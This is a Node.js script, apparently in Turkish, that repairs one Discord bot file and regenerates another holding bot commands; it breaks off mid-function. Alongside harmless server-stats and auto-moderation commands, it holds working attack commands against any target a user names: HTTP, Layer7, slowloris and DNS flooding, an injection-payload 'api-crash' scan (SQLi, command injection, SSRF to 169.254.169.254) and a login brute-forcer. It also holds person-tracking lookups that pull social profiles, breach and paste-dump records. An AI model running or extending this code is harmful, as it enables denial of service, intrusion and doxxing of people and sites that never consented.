// KURTARMA SCRIPTSI - Dosyalari geri yukle
const fs = require('fs');

// ===== 1. KANSERBOT.JS - KAPANIS ONARIMI =====
console.log('=== KANSERBOT.JS ONARIMI ===');

let kanser = fs.readFileSync('src/bots/kanserBot.js', 'utf8');

const missingEnd = `
    default:
      return null; // Bilinmeyen komut
  }
}
`;

// Check if already closed properly
if (kanser.trimEnd().endsWith('}\n}')) {
  console.log('kanserBot.js zaten duzgun kapanmis.');
} else {
  kanser = kanser.trimEnd() + '\n' + missingEnd;
  fs.writeFileSync('src/bots/kanserBot.js', kanser);
  console.log('kanserBot.js kapanisi eklendi.');
}

// ===== 2. NEWCOMMANDS.JS - YENIDEN OLUSTUR =====
// Sadece KALACAK komutlari icerir
console.log('\n=== NEWCOMMANDS.JS YENIDEN OLUSTURULUYOR ===');

const nc = `import { updateInteraction, sendResponse } from '../utils/helpers.js';

export async function handleNewCommand(name, getOption, interaction, request, env, ctx, url) {
  switch (name) {
    // --- SOSYAL MEDYA TARAMA ---

    case 'socmed-engelle':
      ctx.waitUntil((async () => {
        try {
          const username = getOption('kullanici');
          const platforms = [
            { name: 'Instagram', url: \`https://www.instagram.com/\${username}/\` },
            { name: 'Twitter (X)', url: \`https://twitter.com/\${username}\` },
            { name: 'GitHub', url: \`https://github.com/\${username}\` },
            { name: 'Reddit', url: \`https://www.reddit.com/user/\${username}\` },
            { name: 'TikTok', url: \`https://www.tiktok.com/@\${username}\` },
            { name: 'YouTube', url: \`https://www.youtube.com/@\${username}\` },
            { name: 'Twitch', url: \`https://www.twitch.tv/\${username}\` },
            { name: 'Spotify', url: \`https://open.spotify.com/user/\${username}\` },
            { name: 'Steam', url: \`https://steamcommunity.com/id/\${username}\` },
            { name: 'Pinterest', url: \`https://www.pinterest.com/\${username}/\` },
            { name: 'Medium', url: \`https://medium.com/@\${username}\` },
            { name: 'Flickr', url: \`https://www.flickr.com/people/\${username}/\` },
            { name: 'DeviantArt', url: \`https://www.deviantart.com/\${username}\` },
            { name: 'GitLab', url: \`https://gitlab.com/\${username}\` },
            { name: 'Patreon', url: \`https://www.patreon.com/\${username}\` },
            { name: 'HackerNews', url: \`https://news.ycombinator.com/user?id=\${username}\` },
            { name: 'TryHackMe', url: \`https://tryhackme.com/p/\${username}\` },
            { name: 'SoundCloud', url: \`https://soundcloud.com/\${username}\` },
            { name: 'Vimeo', url: \`https://vimeo.com/\${username}\` },
            { name: 'Behance', url: \`https://www.behance.net/\${username}\` },
            { name: 'Dribbble', url: \`https://dribbble.com/\${username}\` },
            { name: 'CodePen', url: \`https://codepen.io/\${username}\` },
            { name: 'Keybase', url: \`https://keybase.io/\${username}\` },
            { name: 'About.me', url: \`https://about.me/\${username}\` },
            { name: 'Goodreads', url: \`https://www.goodreads.com/\${username}\` },
            { name: 'Last.fm', url: \`https://www.last.fm/user/\${username}\` },
            { name: 'Fiverr', url: \`https://www.fiverr.com/\${username}\` },
            { name: 'Roblox', url: \`https://www.roblox.com/user.aspx?username=\${username}\` },
            { name: 'Chess.com', url: \`https://www.chess.com/member/\${username}\` },
            { name: 'Lichess', url: \`https://lichess.org/@/\${username}\` },
            { name: 'Kaggle', url: \`https://www.kaggle.com/\${username}\` },
            { name: 'Pastebin', url: \`https://pastebin.com/u/\${username}\` },
            { name: 'Wattpad', url: \`https://www.wattpad.com/user/\${username}\` },
            { name: 'Tumblr', url: \`https://\${username}.tumblr.com\` },
            { name: 'Blogger', url: \`https://\${username}.blogspot.com\` },
            { name: 'Bandcamp', url: \`https://bandcamp.com/\${username}\` },
            { name: 'BitBucket', url: \`https://bitbucket.org/\${username}/\` },
            { name: 'Replit', url: \`https://replit.com/@\${username}\` },
            { name: 'Codewars', url: \`https://www.codewars.com/users/\${username}\` },
            { name: 'HackerRank', url: \`https://www.hackerrank.com/\${username}\` },
            { name: 'LeetCode', url: \`https://leetcode.com/\${username}/\` },
            { name: 'myspace', url: \`https://myspace.com/\${username}\` },
            { name: 'DailyMotion', url: \`https://www.dailymotion.com/\${username}\` },
            { name: 'Linktree', url: \`https://linktr.ee/\${username}\` },
            { name: 'Telegram', url: \`https://t.me/\${username}\` },
            { name: 'Facebook', url: \`https://www.facebook.com/\${username}\` },
            { name: 'LinkedIn', url: \`https://www.linkedin.com/in/\${username}\` },
            { name: 'Threads', url: \`https://www.threads.net/@\${username}\` },
            { name: 'Bluesky', url: \`https://bsky.app/profile/\${username}\` },
            { name: 'Mastodon', url: \`https://mastodon.social/@\${username}\` }
          ];

          const results = await Promise.allSettled(platforms.map(async p => {
            try {
              const r = await fetch(p.url, {
                method: 'GET',
                headers: { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)' }
              });
              return { name: p.name, url: p.url, exists: r.status === 200 };
            } catch (e) {
              return { name: p.name, url: p.url, exists: false };
            }
          }));

          const found = results.filter(r => r.status === 'fulfilled' && r.value.exists).map(r => r.value);

          if (found.length === 0) {
            await updateInteraction(interaction.application_id, interaction.token, {
              content: \`**Sosyal Medya Taramasi:** \${username}\\n\\n\${platforms.length} platform tarandi.\\nHicbirinde profil bulunamadi.\`
            });
          } else {
            let result = \`**Kapsamli Sosyal Medya Taramasi:** \${username}\\n\`;
            result += \`Taranan: \${platforms.length} platform\\n\`;
            result += \`Bulunan: \${found.length} eslesme\\n\\n\`;
            found.forEach((f, i) => {
              result += \`\${i + 1}. [\${f.name}](\${f.url})\\n\`;
            });
            await updateInteraction(interaction.application_id, interaction.token, { content: result });
          }
        } catch (err) {
          await updateInteraction(interaction.application_id, interaction.token, { content: \`Sosyal medya hatasi: \${err.message}\` });
        }
      })());
      return new Response(JSON.stringify({ type: 5 }), { headers: { 'Content-Type': 'application/json' } });

    // --- IP / PROXY TEST ---

    case 'ip-pool-test':
      ctx.waitUntil((async () => {
        try {
          const ip = getOption('ip');
          let result = \`**IP Pool / Proxy Testi:** \\\\\`\${ip}\\\`\\n\\n\`;

          try {
            const ipRes = await fetch(\`http://ip-api.com/json/\${ip}?fields=status,country,regionName,city,isp,org,as,proxy,hosting,mobile\`);
            const ipData = await ipRes.json();
            if (ipData.status === 'success') {
              result += \`**Lokasyon:** \${ipData.city}, \${ipData.regionName}, \${ipData.country}\\n\`;
              result += \`**ISP:** \${ipData.isp}\\n\`;
              result += \`**Organizasyon:** \${ipData.org}\\n\`;
              result += \`**ASN:** \${ipData.as}\\n\`;
              if (ipData.proxy) result += \`**Proxy/VPN:** EVET - Proxy tespit edildi!\\n\`;
              if (ipData.hosting) result += \`**Hosting/Datacenter:** EVET\\n\`;
              if (ipData.mobile) result += \`**Mobil:** EVET\\n\`;
              result += '\\n';
            }
          } catch (e) {}

          if (env.ABUSEIPDB_API_KEY) {
            try {
              const abRes = await fetch(\`https://api.abuseipdb.com/api/v2/check?ipAddress=\${ip}&maxAgeInDays=90\`, {
                headers: { 'Key': env.ABUSEIPDB_API_KEY, 'Accept': 'application/json' }
              });
              if (abRes.ok) {
                const abData = await abRes.json();
                const d = abData.data;
                result += \`**AbuseIPDB Skoru:** \${d.abuseConfidenceScore}%\\n\`;
                result += \`**Raporlanma:** \${d.totalReports} kez\\n\`;
                result += \`**Alan Adi:** \${d.domain || 'Yok'}\\n\`;
                result += \`**Kullanim:** \${d.usageType || 'Bilinmiyor'}\\n\`;
              }
            } catch (e) {}
          }

          result += \`\\n**Ozet:** Bu IP \${result.includes('Proxy') ? 'BUYUK OLASILIKLA PROXY/VPN' : 'normal kullanici/veri merkezi'}\`;

          await updateInteraction(interaction.application_id, interaction.token, { content: result });
        } catch (err) {
          await updateInteraction(interaction.application_id, interaction.token, { content: \`IP test hatasi: \${err.message}\` });
        }
      })());
      return new Response(JSON.stringify({ type: 5 }), { headers: { 'Content-Type': 'application/json' } });

    // --- DIJITAL AYAK IZI ---

    case 'dijital-iz':
      ctx.waitUntil((async () => {
        try {
          const kullanici = getOption('kullanici');
          let result = \`**Dijital Ayak Izi Analizi:** \${kullanici}\\n\\n\`;

          try {
            const ghRes = await fetch(\`https://api.github.com/users/\${kullanici}\`, {
              headers: env.GITHUB_TOKEN ? { 'Authorization': \`Bearer \${env.GITHUB_TOKEN}\` } : {}
            });
            if (ghRes.ok) {
              const gh = await ghRes.json();
              result += \`**GitHub:** Mevcut\\n\`;
              result += \`Isim: \${gh.name || 'Gizli'}\\n\`;
              result += \`Repolar: \${gh.public_repos}\\n\`;
              result += \`Lokasyon: \${gh.location || 'Gizli'}\\n\`;
              if (gh.email && !gh.email.includes('noreply')) result += \`Email: \${gh.email}\\n\`;
              result += \`Olusturma: \${gh.created_at}\\n\\n\`;
            }
          } catch (e) {}

          if (env.HIBP_API_KEY) {
            try {
              const hibpRes = await fetch(\`https://haveibeenpwned.com/api/v3/breachedaccount/\${encodeURIComponent(kullanici)}?truncateResponse=true\`, {
                headers: { 'hibp-api-key': env.HIBP_API_KEY }
              });
              if (hibpRes.ok) {
                const breaches = await hibpRes.json();
                if (breaches.length > 0) {
                  result += \`**Veri Sizintilari (HIBP):** \${breaches.length} adet\\n\`;
                  breaches.slice(0, 3).forEach(b => result += \`• \${b.Name} (\${b.BreachDate})\\n\`);
                  result += '\\n';
                }
              }
            } catch (e) {}
          }

          try {
            const psRes = await fetch(\`https://psbdmp.cc/api/search/\${encodeURIComponent(kullanici)}\`);
            if (psRes.ok) {
              const psData = await psRes.json();
              if (psData.count > 0) {
                result += \`**Public Kaynak:** psbdmp.cc'de \${psData.count} kayit\\n\`;
              }
            }
          } catch (e) {}

          const socmedSites = [
            { name: 'Instagram', url: u => \`https://www.instagram.com/\${u}/\` },
            { name: 'Twitter', url: u => \`https://twitter.com/\${u}\` },
            { name: 'Reddit', url: u => \`https://www.reddit.com/user/\${u}\` },
            { name: 'Telegram', url: u => \`https://t.me/\${u}\` },
            { name: 'YouTube', url: u => \`https://www.youtube.com/@\${u}\` }
          ];

          let socmedCount = 0;
          await Promise.allSettled(socmedSites.map(async s => {
            try {
              const r = await fetch(s.url(kullanici), {
                headers: { 'User-Agent': 'Mozilla/5.0' }
              });
              if (r.status === 200) socmedCount++;
            } catch (e) {}
          }));

          result += \`**Sosyal Medya Varligi:** \${socmedCount}/\${socmedSites.length} platformda profil bulundu\\n\`;

          if (!result.includes('GitHub') && !result.includes('Veri Sizintilari')) {
            result += \`\\nBu kullanici icin derin kayit bulunamadi.\`;
          }

          await updateInteraction(interaction.application_id, interaction.token, { content: result });
        } catch (err) {
          await updateInteraction(interaction.application_id, interaction.token, { content: \`Dijital iz hatasi: \${err.message}\` });
        }
      })());
      return new Response(JSON.stringify({ type: 5 }), { headers: { 'Content-Type': 'application/json' } });

    // --- EMAIL PATTERN ---

    case 'email-synt':
      ctx.waitUntil((async () => {
        try {
          const domain = getOption('domain');
          const isim = getOption('isim') || '';
          let result = \`**E-posta Pattern Tahmini:** \${domain}\\n\\n\`;

          const patterns = [];

          if (isim) {
            const parts = isim.toLowerCase().trim().split(/\\\\s+/);
            if (parts.length >= 2) {
              const ad = parts[0];
              const soyad = parts[parts.length - 1];
              const adTum = parts.join('');
              const adNokta = parts.join('.');

              patterns.push(
                \`\${ad}@\${domain}\`,
                \`\${soyad}@\${domain}\`,
                \`\${ad}.\${soyad}@\${domain}\`,
                \`\${ad}_\${soyad}@\${domain}\`,
                \`\${ad[0]}.\${soyad}@\${domain}\`,
                \`\${ad[0]}\${soyad}@\${domain}\`,
                \`\${ad}\${soyad[0]}@\${domain}\`,
                \`\${soyad}.\${ad}@\${domain}\`,
                \`\${ad[0]}.\${soyad[0]}@\${domain}\`,
                \`\${ad}\${soyad}@\${domain}\`
              );
            }
          } else {
            const common = ['info', 'admin', 'contact', 'support', 'sales', 'help', 'mail', 'webmaster', 'noreply', 'hello', 'hr', 'team', 'billing', 'security', 'dev'];
            patterns.push(...common.map(p => \`\${p}@\${domain}\`));
          }

          result += \`**Tahmini E-potalar:**\\n\`;
          patterns.slice(0, 10).forEach((p, i) => {
            result += \`\${i + 1}. \\\\\`\${p}\\\\`\\n\`;
          });

          result += \`\\n**Toplam Pattern:** \${patterns.length}\\n\`;
          result += \`\\n**Dogrulama:** /email-sorgula ile bu adresleri kontrol edebilirsin.\`;

          await updateInteraction(interaction.application_id, interaction.token, { content: result });
        } catch (err) {
          await updateInteraction(interaction.application_id, interaction.token, { content: \`Email pattern hatasi: \${err.message}\` });
        }
      })());
      return new Response(JSON.stringify({ type: 5 }), { headers: { 'Content-Type': 'application/json' } });

    // --- SUNUCU ISTATISTIK ---

    case 'sunucu-istatistik':
      ctx.waitUntil((async () => {
        try {
          const guildId = interaction.guild_id;
          let result = \`**Sunucu Istatistikleri**\\n\\n\`;

          const guildRes = await fetch(\`https://discord.com/api/v10/guilds/\${guildId}\`, {
            headers: { 'Authorization': \`Bot \${env.DISCORD_TOKEN}\` }
          });
          if (guildRes.ok) {
            const g = await guildRes.json();
            result += \`**Sunucu:** \${g.name}\\n\`;
            result += \`**ID:** \\\\\`\${guildId}\\\`\\n\`;
            result += \`**Olusturulma:** \${new Date(g.id / 4194304 + 1420070400000).toUTCString()}\\n\`;
            result += \`**Uye Sayisi:** \${g.approximate_member_count || 'Bilinmiyor'}\\n\`;
            result += \`**Aktif Uye:** \${g.approximate_presence_count || 'Bilinmiyor'}\\n\`;
            result += \`**Boost Seviyesi:** \${g.premium_tier || 0}\\n\`;
            result += \`**Boost Sayisi:** \${g.premium_subscription_count || 0}\\n\`;
            if (g.owner_id) result += \`**Sahip ID:** \\\\\`\${g.owner_id}\\\`\\n\`;
            if (g.vanity_url_code) result += \`**Ozel URL:** discord.gg/\${g.vanity_url_code}\\n\`;
          }

          try {
            const chRes = await fetch(\`https://discord.com/api/v10/guilds/\${guildId}/channels\`, {
              headers: { 'Authorization': \`Bot \${env.DISCORD_TOKEN}\` }
            });
            if (chRes.ok) {
              const channels = await chRes.json();
              const textChannels = channels.filter(c => c.type === 0).slice(0, 5);
              result += \`\\n**En Aktif Kanallar:**\\n\`;
              textChannels.forEach(c => {
                result += \`• <#\${c.id}>\\n\`;
              });
            }
          } catch (e) {}

          try {
            const emojiRes = await fetch(\`https://discord.com/api/v10/guilds/\${guildId}/emojis\`, {
              headers: { 'Authorization': \`Bot \${env.DISCORD_TOKEN}\` }
            });
            if (emojiRes.ok) {
              const emojis = await emojiRes.json();
              result += \`\\n**Emoji Sayisi:** \${emojis.length}\\n\`;
            }
          } catch (e) {}

          await updateInteraction(interaction.application_id, interaction.token, { content: result });
        } catch (err) {
          await updateInteraction(interaction.application_id, interaction.token, { content: \`Sunucu istatistik hatasi: \${err.message}\` });
        }
      })());
      return new Response(JSON.stringify({ type: 5 }), { headers: { 'Content-Type': 'application/json' } });

    // --- OTO-MODERASYON ---

    case 'oto-moderasyon':
      ctx.waitUntil((async () => {
        try {
          const guildId = interaction.guild_id;
          const aksiyon = getOption('islem') || 'durum';
          let result = \`**Otomatik Moderasyon**\\n\\n\`;

          if (aksiyon === 'durum' || aksiyon === 'listele') {
            const amRes = await fetch(\`https://discord.com/api/v10/guilds/\${guildId}/auto-moderation/rules\`, {
              headers: { 'Authorization': \`Bot \${env.DISCORD_TOKEN}\` }
            });
            if (amRes.ok) {
              const rules = await amRes.json();
              if (rules.length > 0) {
                result += \`**Auto-Mod Kurallari (\${rules.length} adet):**\\n\`;
                rules.slice(0, 10).forEach((r, i) => {
                  result += \`\${i + 1}. \${r.name} (\${r.event_type === 1 ? 'Mesaj' : 'Uye Katilimi'})\\n\`;
                  result += \`   - Aktif: \${r.enabled ? '✅' : '❌'}\\n\`;
                });
              } else {
                result += \`Henuz auto-mod kurali eklenmemis.\\n\`;
                result += \`\\\`/oto-moderasyon islem:ekle\\\` ile kural ekleyebilirsin.\\n\`;
              }
            }
          } else if (aksiyon === 'ekle') {
            const newRule = {
              name: 'Otomatik Spam/Kufur Korumasi',
              event_type: 1,
              trigger_type: 1,
              trigger_metadata: {
                keyword_filter: ['spam', '@everyone', '@here', 'discord.gg'],
                regex_patterns: [],
                mention_total_limit: 5
              },
              actions: [{ type: 1 }],
              enabled: true
            };
            const createRes = await fetch(\`https://discord.com/api/v10/guilds/\${guildId}/auto-moderation/rules\`, {
              method: 'POST',
              headers: { 'Authorization': \`Bot \${env.DISCORD_TOKEN}\`, 'Content-Type': 'application/json' },
              body: JSON.stringify(newRule)
            });
            if (createRes.ok) {
              result += \`✅ Auto-mod kurali basariyla eklendi!\\n\`;
              result += \`**Kural:** Otomatik Spam/Kufur Korumasi\\n\`;
            } else {
              const errData = await createRes.text();
              result += \`❌ Kural eklenemedi: \${errData.slice(0, 200)}\\n\`;
            }
          } else if (aksiyon === 'temizle') {
            const amRes = await fetch(\`https://discord.com/api/v10/guilds/\${guildId}/auto-moderation/rules\`, {
              headers: { 'Authorization': \`Bot \${env.DISCORD_TOKEN}\` }
            });
            if (amRes.ok) {
              const rules = await amRes.json();
              let silinen = 0;
              for (const rule of rules) {
                const delRes = await fetch(\`https://discord.com/api/v10/guilds/\${guildId}/auto-moderation/rules/\${rule.id}\`, {
                  method: 'DELETE',
                  headers: { 'Authorization': \`Bot \${env.DISCORD_TOKEN}\` }
                });
                if (delRes.ok || delRes.status === 204) silinen++;
              }
              result += \`✅ \${silinen} auto-mod kurali basariyla silindi.\\n\`;
            }
          }

          await updateInteraction(interaction.application_id, interaction.token, { content: result });
        } catch (err) {
          await updateInteraction(interaction.application_id, interaction.token, { content: \`Oto-moderasyon hatasi: \${err.message}\` });
        }
      })());
      return new Response(JSON.stringify({ type: 5 }), { headers: { 'Content-Type': 'application/json' } });

    // --- GELISMIS ID ANALIZI ---

    case 'gelismis-id':
      ctx.waitUntil((async () => {
        try {
          const id = getOption('id');
          const discordEpoch = 1420070400000n;
          const snowflake = BigInt(id);
          const timestamp = (snowflake >> 22n) + discordEpoch;
          const date = new Date(Number(timestamp));
          const yas = Math.floor((Date.now() - Number(timestamp)) / (365.25 * 24 * 60 * 60 * 1000));
          const isBot = (snowflake >> 22n) % 2n === 1n;

          let result = \`**Gelismis ID Analizi:** \\\\\`\${id}\\\`\\n\\n\`;
          result += \`**Hesap Yas Bilgisi:**\\n\`;
          result += \`• Olusturulma: \${date.toUTCString()}\\n\`;
          result += \`• Yas: \${yas} yil\\n\`;
          result += \`• Tip: \${isBot ? 'Robot/Bot' : 'Kullanici'}\\n\\n\`;

          const userRes = await fetch(\`https://discord.com/api/v10/users/\${id}\`, {
            headers: { 'Authorization': \`Bot \${env.DISCORD_TOKEN}\` }
          });

          if (userRes.ok) {
            const u = await userRes.json();
            result += \`**Profil Bilgileri:**\\n\`;
            result += \`• Kullanici: \${u.global_name || u.username || 'Yok'}\\n\`;
            result += \`• Kullanici Adi: \${u.username || 'Yok'}\`;
            if (u.discriminator && u.discriminator !== '0') result += \`#\${u.discriminator}\`;
            result += '\\n';

            if (u.avatar) {
              const ext = u.avatar.startsWith('a_') ? 'gif' : 'png';
              const avatarUrl = \`https://cdn.discordapp.com/avatars/\${id}/\${u.avatar}.\${ext}?size=256\`;
              result += \`• Mevcut Avatar: [Link](\${avatarUrl})\\n\`;
            } else {
              const defaultNum = parseInt(id.slice(-4)) % 6;
              result += \`• Avatar: Varsayilan (\\\`Blurple\`\\\`\${defaultNum}\\\`)\\n\`;
            }

            if (u.banner) {
              const ext2 = u.banner.startsWith('a_') ? 'gif' : 'png';
              const bannerUrl = \`https://cdn.discordapp.com/banners/\${id}/\${u.banner}.\${ext2}?size=256\`;
              result += \`• Banner: [Link](\${bannerUrl})\\n\`;
            }

            if (u.accent_color) {
              result += \`• Profil Rengi: #\${u.accent_color.toString(16).padStart(6, '0')}\\n\`;
            }

            const premiumNames = { 0: 'Yok', 1: 'Nitro Classic', 2: 'Nitro', 3: 'Nitro Basic' };
            result += \`• Nitro: \${premiumNames[u.premium_type] || 'Bilinmiyor'}\\n\`;

            if (u.public_flags) {
              const badges = [];
              if (u.public_flags & 1) badges.push('Discord Calisani');
              if (u.public_flags & 2) badges.push('Partner Sahibi');
              if (u.public_flags & 4) badges.push('HypeSquad Events');
              if (u.public_flags & 8) badges.push('Bug Hunter L1');
              if (u.public_flags & 16384) badges.push('Bug Hunter L2');
              if (u.public_flags & 512) badges.push('Early Supporter');
              if (u.public_flags & 131072) badges.push('Erken Bot Gelistirici');
              if (u.public_flags & 262144) badges.push('Sertifikali Mod');
              if (u.public_flags & 4194304) badges.push('Aktif Gelistirici');
              if (badges.length > 0) result += \`• Rozetler: \${badges.join(', ')}\\n\`;
            }
          } else if (userRes.status === 404) {
            result += \`\\n❌ Bu hesap SILINMIS veya gecerli degil.\\n\`;
          } else {
            result += \`\\n⚠️ Discord API profil bilgisi alinamadi.\\n\`;
          }

          if (!isBot) {
            try {
              const dmTest = await fetch('https://discord.com/api/v10/users/@me/channels', {
                method: 'POST',
                headers: { 'Authorization': \`Bot \${env.DISCORD_TOKEN}\`, 'Content-Type': 'application/json' },
                body: JSON.stringify({ recipient_id: id })
              });
              if (dmTest.status === 403) {
                result += \`\\n**Hesap Durumu:** DM atilamiyor (Suspended/Deaktif)\\n\`;
              } else if (dmTest.ok) {
                result += \`\\n**Hesap Durumu:** ✅ Aktif\\n\`;
              }
            } catch (e) {}
          }

          if (isBot) {
            try {
              const tgRes = await fetch(\`https://top.gg/api/bots/\${id}\`);
              if (tgRes.ok) {
                const tg = await tgRes.json();
                result += \`\\n**top.gg:** \${tg.username || 'Bilinmiyor'}\`;
                if (tg.guilds) result += \` - \${tg.guilds.toLocaleString()} sunucu\`;
                result += '\\n';
              }
            } catch (e) {}
          }

          await updateInteraction(interaction.application_id, interaction.token, { content: result });
        } catch (err) {
          await updateInteraction(interaction.application_id, interaction.token, { content: \`ID analiz hatasi: \${err.message}\` });
        }
      })());
      return new Response(JSON.stringify({ type: 5 }), { headers: { 'Content-Type': 'application/json' } });

    // --- LAYER7 + FLOOD KOMUTLARI ---

    case 'layer7':
      ctx.waitUntil((async () => {
        try {
          const hedef = getOption('hedef');
          const sure = Math.min(Math.max(getOption('sure') || 5, 1), 15);
          const targetUrl = hedef.startsWith('http') ? hedef : \`http://\${hedef}\`;
          const bitisZamani = Date.now() + (sure * 1000);

          const userAgents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Chrome/120.0.0.0',
            'Mozilla/5.0 (X11; Linux x86_64) Chrome/120.0.0.0',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0) Mobile/15E148'
          ];

          let basarili = 0, bloklandi = 0;
          const durumKodlari = {};

          while (Date.now() < bitisZamani) {
            const batch = Array.from({ length: 10 }, () => {
              const ua = userAgents[Math.floor(Math.random() * userAgents.length)];
              const randomPath = ['/', '/wp-admin/', '/admin/', '/login', '/api/', '/test'][Math.floor(Math.random() * 6)];
              const randomUrl = \`\${targetUrl.replace(/\\\\/\$/, '')}\${randomPath}?t=\${Date.now()}\`;

              return fetch(randomUrl, {
                method: 'GET',
                headers: {
                  'User-Agent': ua,
                  'Accept': 'text/html,*/*',
                  'Cache-Control': 'no-cache'
                },
                redirect: 'manual'
              }).then(res => {
                if (res.status === 403 || res.status === 429) bloklandi++;
                else basarili++;
                durumKodlari[res.status] = (durumKodlari[res.status] || 0) + 1;
              }).catch(() => { bloklandi++; });
            });
            await Promise.allSettled(batch);
          }

          const durumOzeti = Object.entries(durumKodlari).sort((a, b) => b[1] - a[1]).slice(0, 5).map(([k, v]) => \`\${k}: \${v}\`).join(', ');
          const result = \`**Layer7 Stres Testi:** \${hedef}\\n\\n\`;
          result += \`Sure: \${sure}s\\n\`;
          result += \`Basarili Istek: \${basarili}\\n\`;
          result += \`Engellenen: \${bloklandi}\\n\`;
          result += \`Durum Kodlari: \${durumOzeti || 'Yok'}\\n\`;

          await updateInteraction(interaction.application_id, interaction.token, { content: result });
        } catch (err) {
          await updateInteraction(interaction.application_id, interaction.token, { content: \`Layer7 hatasi: \${err.message}\` });
        }
      })());
      return new Response(JSON.stringify({ type: 5 }), { headers: { 'Content-Type': 'application/json' } });

    case 'slowloris':
      ctx.waitUntil((async () => {
        try {
          const hedef = getOption('hedef');
          const sure = Math.min(Math.max(getOption('sure') || 10, 1), 20);
          const targetUrl = hedef.startsWith('http') ? hedef : \`http://\${hedef}\`;
          const bitisZamani = Date.now() + (sure * 1000);

          let baglantiSayisi = 0, basarili = 0;
          while (Date.now() < bitisZamani) {
            try {
              const c = new AbortController();
              setTimeout(() => c.abort(), sure * 1000);
              await fetch(targetUrl, {
                method: 'GET',
                headers: { 'User-Agent': 'Mozilla/5.0' },
                signal: c.signal
              });
              basarili++;
            } catch (e) {}
            baglantiSayisi++;
          }

          const result = \`**Slowloris Testi:** \${hedef}\\n\\n\`;
          result += \`Sure: \${sure}s\\n\`;
          result += \`Acilan Baglanti: \${baglantiSayisi}\\n\`;
          result += \`Basarili: \${basarili}\\n\`;

          await updateInteraction(interaction.application_id, interaction.token, { content: result });
        } catch (err) {
          await updateInteraction(interaction.application_id, interaction.token, { content: \`Slowloris hatasi: \${err.message}\` });
        }
      })());
      return new Response(JSON.stringify({ type: 5 }), { headers: { 'Content-Type': 'application/json' } });

    case 'http-flood':
      ctx.waitUntil((async () => {
        try {
          const hedef = getOption('hedef');
          const sure = Math.min(Math.max(getOption('sure') || 5, 1), 10);
          const metod = (getOption('metod') || 'GET').toUpperCase();
          const targetUrl = hedef.startsWith('http') ? hedef : \`http://\${hedef}\`;
          const bitisZamani = Date.now() + (sure * 1000);

          let toplam = 0, basarili = 0;
          while (Date.now() < bitisZamani) {
            const batch = Array.from({ length: 25 }, () => {
              const randomUrl = \`\${targetUrl}?_=\${Date.now()}\`;
              return fetch(randomUrl, {
                method: metod,
                headers: { 'User-Agent': 'Mozilla/5.0' }
              }).then(r => { basarili++; }).catch(() => {});
            });
            await Promise.allSettled(batch);
            toplam += 25;
          }

          const result = \`**HTTP Flood:** \${hedef}\\n\`;
          result += \`Metod: \${metod} | Sure: \${sure}s\\n\`;
          result += \`Toplam Istek: \${toplam} | Basarili: \${basarili}\\n\`;

          await updateInteraction(interaction.application_id, interaction.token, { content: result });
        } catch (err) {
          await updateInteraction(interaction.application_id, interaction.token, { content: \`HTTP flood hatasi: \${err.message}\` });
        }
      })());
      return new Response(JSON.stringify({ type: 5 }), { headers: { 'Content-Type': 'application/json' } });

    case 'dns-flood':
      ctx.waitUntil((async () => {
        try {
          const domain = getOption('domain');
          const sure = Math.min(Math.max(getOption('sure') || 5, 1), 10);
          const bitisZamani = Date.now() + (sure * 1000);

          let toplam = 0, basarili = 0;
          while (Date.now() < bitisZamani) {
            try {
              const res = await fetch(\`https://cloudflare-dns.com/dns-query?name=\${domain}&type=A\`, {
                headers: { 'accept': 'application/dns-json' }
              });
              if (res.ok) basarili++;
            } catch (e) {}
            toplam++;
          }

          const result = \`**DNS Flood:** \${domain}\\n\`;
          result += \`Sure: \${sure}s | Toplam: \${toplam} | Basarili: \${basarili}\\n\`;

          await updateInteraction(interaction.application_id, interaction.token, { content: result });
        } catch (err) {
          await updateInteraction(interaction.application_id, interaction.token, { content: \`DNS flood hatasi: \${err.message}\` });
        }
      })());
      return new Response(JSON.stringify({ type: 5 }), { headers: { 'Content-Type': 'application/json' } });

    case 'api-crash':
      ctx.waitUntil((async () => {
        try {
          const urlInput = getOption('url');
          const targetUrl = urlInput.startsWith('http') ? urlInput : \`https://\${urlInput}\`;

          const payloads = [
            { name: 'SQLi', payload: "' OR '1'='1" },
            { name: 'XSS', payload: '<script>alert(1)</script>' },
            { name: 'Path Trav', payload: '../../../etc/passwd' },
            { name: 'Cmd Inj', payload: '; cat /etc/passwd' },
            { name: 'NoSQL', payload: '{\"\\$ne\": null}' },
            { name: 'SSRF', payload: 'http://169.254.169.254/' }
          ];

          let result = \`**API Crash Test:** \${targetUrl}\\n\\n\`;
          let blocked = 0;

          for (const p of payloads) {
            try {
              const testUrl = \`\${targetUrl}\${targetUrl.includes('?') ? '&' : '?'}test=\${encodeURIComponent(p.payload)}\`;
              const res = await fetch(testUrl, { headers: { 'User-Agent': 'Mozilla/5.0' }, redirect: 'manual' });
              const isBlocked = res.status === 403 || res.status === 406 || res.status === 429;
              if (isBlocked) blocked++;
              result += \`\${isBlocked ? '🚫' : '⚠️'} \${p.name}: \${res.status}\\n\`;
            } catch (e) {
              result += \`❌ \${p.name}: Hata\\n\`;
            }
          }

          result += \`\\n**Ozet:** \${blocked}/\${payloads.length} engellendi.\`;

          await updateInteraction(interaction.application_id, interaction.token, { content: result });
        } catch (err) {
          await updateInteraction(interaction.application_id, interaction.token, { content: \`API crash hatasi: \${err.message}\` });
        }
      })());
      return new Response(JSON.stringify({ type: 5 }), { headers: { 'Content-Type': 'application/json' } });

    case 'brute-force':
      ctx.waitUntil((async () => {
        try {
          const url = getOption('url');
          const kullanici = getOption('kullanici') || 'admin';
          const kAd = getOption('k_ad') || 'username';
          const sAd = getOption('s_ad') || 'password';

          const passwords = ['123456', 'password', 'admin', '12345678', 'qwerty', 'letmein', 'welcome', 'monkey', 'dragon', 'master', 'login', 'abc123', 'passw0rd', 'iloveyou', 'sunshine', 'princess', 'football'];
          let found = false;
          let result = \`**Brute Force:** \${url}\\nKullanici: \${kullanici}\\n\\n\`;

          for (let i = 0; i < Math.min(passwords.length, 10); i++) {
            try {
              const formBody = new URLSearchParams();
              formBody.append(kAd, kullanici);
              formBody.append(sAd, passwords[i]);

              const res = await fetch(url, {
                method: 'POST',
                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                body: formBody.toString(),
                redirect: 'manual'
              });

